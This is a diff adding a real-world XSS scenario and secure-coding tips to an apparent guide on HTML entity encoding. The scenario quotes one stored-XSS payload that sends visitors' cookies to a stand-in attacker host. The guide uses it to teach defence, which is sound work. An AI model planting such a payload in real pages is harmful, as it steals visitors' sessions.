@@ -207,6 +207,30 @@ npm install -g he
 echo '<b>Hello</b>' | he --encode
 ```
 
+## Real-World Scenario
+
+A developer building a community forum feature needs to display user-submitted posts on a page. The posts can contain any text — usernames, code snippets, math notation, even intentional HTML. Without proper encoding, a user who submits the text `<script>document.location='https://attacker.com?q='+document.cookie</script>` as their post body will have that script execute in every visitor's browser the moment the page loads. This is a stored XSS attack, and it's one of the most common web vulnerabilities precisely because it's easy to forget.
+
+The fix is straightforward but must be applied at every insertion point. In React, `{userPost}` in JSX is safe because React encodes it automatically — but `<div dangerouslySetInnerHTML={{ __html: userPost }} />` is not. In a templating engine like Jinja2 or Handlebars, `{{ post }}` is auto-escaped by default, but `{{{ post }}}` (triple braces in Handlebars) or `{{ post | safe }}` in Jinja bypasses that protection. Knowing exactly when your framework stops protecting you is as important as knowing how to encode manually.
+
+A second common scenario is writing documentation or technical blog posts. You want to show the reader a literal `<div>` or an HTML attribute like `onClick="..."` as visible text on the page, not as executed markup. Any content management system that renders HTML will interpret those angle brackets unless they're entity-encoded. Running your code examples through an HTML entity encoder before pasting into a WYSIWYG editor, or understanding that your Markdown processor handles this automatically in fenced code blocks, saves time debugging invisible rendering failures.
+
+---
+
+## Quick Tips
+
+1. **Never use `innerHTML` with untrusted data.** Assign user-provided text with `element.textContent` instead — the browser handles encoding automatically. Reserve `innerHTML` for content you have sanitized with a library like DOMPurify.
+
+2. **Encode in the right context.** HTML entity encoding (`&lt;`, `&amp;`) is correct for HTML content and attributes. For URLs, use `encodeURIComponent()`. For JavaScript string literals, use JSON encoding. Using HTML encoding inside a `<script>` block or URL context will not prevent injection — each context has its own encoding rules.
+
+3. **Use `he` in Node.js instead of rolling your own.** The `he` npm package handles all named entities, numeric entities, and edge cases in the HTML5 spec. A manual `replace()` chain will miss character combinations that the spec defines as valid entity sequences.
+
+4. **Quote all HTML attributes, always.** An unquoted attribute like `<div class=user-value>` becomes an XSS vector if `user-value` contains a space followed by `onclick=...`. Quoting attributes (`class="user-value"`) and encoding the value inside them eliminates this attack surface.
+
+5. **Audit uses of `dangerouslySetInnerHTML` in React codebases.** Search your entire codebase for this prop — each occurrence is a potential XSS point. Any of them that accept data from a user, an API, or a database must sanitize the HTML with DOMPurify before rendering.
+
+---
+
 ## Conclusion
 
 HTML entity encoding is fundamental to web security and correctness. Always encode user-generated content before inserting it into HTML. Use a JSON-aware approach when encoding is needed programmatically, and rely on framework-level escaping (React, Vue, Angular) whenever possible.
